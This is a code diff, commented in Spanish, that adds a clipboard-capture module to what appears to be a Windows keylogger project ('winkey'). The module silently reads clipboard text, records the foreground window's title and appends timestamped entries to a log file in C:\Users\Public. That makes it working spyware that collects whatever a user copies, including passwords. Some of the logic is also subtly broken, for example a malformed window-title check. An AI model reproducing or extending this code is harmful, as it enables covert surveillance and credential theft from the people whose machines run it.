@@ -1,79 +1,127 @@
 #include "winkey.h"
-// funcion para debuggear y ver en un archivo
-#include <stdarg.h> 
 
-void DebugLog(const char* format, ...)
+t_ClipboardState g_clipboardState = {0};
+
+// Abre/crea C:\Users\Public\clipboard.log
+
+BOOL OpenClipboardLog(void)
 {
-    FILE* debugFile;
-    // Usamos una ruta fija en ProgramData para asegurar los permisos
-    errno_t err = fopen_s(&debugFile, "C:\\ProgramData\\debug_winkey.log", "a");
-    if (err == 0 && debugFile != NULL) {
-        // Añadir un timestamp
-        time_t now = time(NULL);
-        struct tm t;
-        localtime_s(&t, &now);
-        fprintf(debugFile, "[%02d:%02d:%02d] ", t.tm_hour, t.tm_min, t.tm_sec);
+    char        logPath[MAX_PATH];
+    time_t      currentTime;
+    struct tm   timeInfo;
 
-        // Escribir el mensaje formateado
-        va_list args;
-        va_start(args, format);
-        vfprintf(debugFile, format, args);
-        va_end(args);
+    // Crear la ruta completa del archivo de log clipboard
+    snprintf(logPath, sizeof(logPath), "C:\\Users\\Public\\clipboard.log");
 
-        fprintf(debugFile, "\n");
-        fclose(debugFile);
+    // Abrir el archivo de log de forma segura
+    if (fopen_s(&g_clipboardState.clipboardFile, logPath, "a") != 0 || !g_clipboardState.clipboardFile)
+        return FALSE;
+
+    // Obtener tiempo actual y escribir cabecera de inicio
+    time(&currentTime);
+    localtime_s(&timeInfo, &currentTime);
+
+    fprintf(g_clipboardState.clipboardFile,
+            "\n=== Clipboard Log Start: %02d/%02d/%04d %02d:%02d:%02d ===\n",
+            timeInfo.tm_mday, timeInfo.tm_mon + 1, timeInfo.tm_year + 1900,
+            timeInfo.tm_hour, timeInfo.tm_min, timeInfo.tm_sec);
+    fflush(g_clipboardState.clipboardFile);
+    (void)logPath; // Evita warning si no se usa
+    return TRUE;
+}
+
+// Cierra el archivo log del clipboard
+void CloseClipboardLog(void)
+{
+    if (g_clipboardState.clipboardFile) {
+        fprintf(g_clipboardState.clipboardFile, "=== Clipboard Log End ===\n");
+        fflush(g_clipboardState.clipboardFile);
+        fclose(g_clipboardState.clipboardFile);
+        g_clipboardState.clipboardFile = NULL;
     }
 }
 
-/**
-    Leer el texto actual del portapapeles de Windows.
-    Compararlo con lo que tenemos guardado en lastClipboardText.
-    Si son diferentes: ¡Significa que el usuario ha copiado algo nuevo! Lo guardamos en el log y actualizamos lastClipboardText con este nuevo texto.
-    Si son iguales: No hacemos nada
-    Usar malloc para guardar mas espacio?
- */
-
-// variable estatica para recordar el ultimo texto guardado
-static char lastClipboardText[512] = {0};
-
-// funcion para registrar el contenido del portapapeles
-void LogClipboardIfChanged(void)
+// Obtiene el titulo de la ventana activa
+static BOOL getActiveWindowTitle(char *buffer, size_t bufSize)
 {
-    // Comprobamos si el archivo de log esta abierto
-    if (!g_winkeyState.logFile) {
-        DebugLog("El archivo de log principal no está abierto. Saliendo.");
-        return ;
+    HWND    activeWindow;
+    int     titleLength;
+
+    activeWindow = GetForegroundWindow();
+    if (!activeWindow)
+        return FALSE;
+    
+    titleLength = GetWindowTextA(activeWindow, buffer, (int)bufSize);
+    if (!titleLength <= 0) {
+        strcpy_s(buffer, bufSize, "Unknown Window");
+        return FALSE;
+    }
+    return TRUE;
+}
+
+// Escribe timestamp + ventana activa + texto nuevo
+static void writeClipboardEntry(const char *text, const char *windowTitle)
+{
+    time_t      currentTime;
+    struct tm   timeInfo;
+
+    time(&currentTime);
+    localtime_s(&timeInfo, &currentTime);
+    fprintf(g_clipboardState.clipboardFile,
+            "[%04d-%02d-%02d %02d:%02d:%02d] - Window: '%s'\n%s\n\n",
+        timeInfo.tm_year + 1900, timeInfo.tm_mon + 1, timeInfo.tm_mday,
+        timeInfo.tm_hour, timeInfo.tm_min, timeInfo.tm_sec, windowTitle, text);
+    fflush(g_clipboardState.clipboardFile);
+}
+
+// Obtiene texto (UTF-16 -> UTF-8 simple) del portapapeles
+// Devuelve TRUE si no hay texto valido
+static BOOL getClipboardText(char *buffer, size_t bufSize)
+{
+    HGLOBAL         hData;
+    const wchar_t   *wdata;
+    int             len;
+
+    if (!OpenClipboard(NULL))
+        return FALSE;
+
+    hData = GetClipboardData(CF_UNICODETEXT);
+    if (!hData) {
+        CloseClipboard();
+        return FALSE;
     }
 
-        // Intentamos abrir el portapapeles, si no, lo intentamos despues
-        // Pasamos NULL porque nuestro programa no tiene una ventana principal (HWND)
-        if (!OpenClipboard(NULL)) {
-            return;
-        }
-        // Vemos que hay dentro del porpapeles
-        HANDLE hData = GetClipboardData(CF_TEXT);
-        if (hData == NULL) {
-            // Si devuelve NULL, significa que el porpapeles no tiene texto
-            CloseClipboard();
-            return;
-        }
-        // Bloqueamos el handle para obtener un puntero de memoria real
-        // convertido a char* para poder leerlo como texto
-        char* clipboardText = (char*)GlobalLock(hData);
-        if (clipboardText == NULL) {
-            CloseClipboard();
-            return;
-        }
-        // Comparamos el texto actual con el ultimo que guardamos.
-        if (strcmp(clipboardText, lastClipboardText) != 0 && strlen(clipboardText) > 0) {
-            // Escribimos cabecera portapapeles
-            fprintf(g_winkeyState.logFile, "\n\n####### Init clipboard #######\n%s\n####### finish clipboard #######\n", clipboardText);
-            fflush(g_winkeyState.logFile);
-            // actualizamos nuestra memoria interna con el nuevo texto
-            strcpy_s(lastClipboardText, sizeof(lastClipboardText), clipboardText);
-        }
-        // Desbloqueamos la memoria
-        GlobalUnlock(hData);
-        //Cerramos portapapeles
+    wdata = (const wchar_t*)GlobalLock(hData);
+    if (!wdata) {
         CloseClipboard();
+        return FALSE;
+    }
+
+    len = WideCharToMultiByte(CP_UTF8, 0, wdata, -1, buffer, (int)bufSize, NULL, NULL);
+    GlobalUnlock(hData);
+    CloseClipboard();
+    
+    return (len > 1);
+}
+
+// Comprueba si el texto cambió y lo registra
+void LogClipboardIfChanged(void)
+{
+    char    current[512];
+    char    windowTitle[256];
+
+    if (!g_clipboardState.clipboardFile) {
+        if (!OpenClipboardLog())
+            return ;
+    }
+
+    if (!getClipboardText(current, sizeof(current)))
+        return ;
+
+    if (strcmp(current, g_clipboardState.lastClipboardText) == 0)
+        return ;
+
+    getActiveWindowTitle(windowTitle, sizeof(windowTitle));
+    writeClipboardEntry(current, windowTitle);
+    strcpy_s(g_clipboardState.lastClipboardText, sizeof(g_clipboardState.lastClipboardText), current);
 }
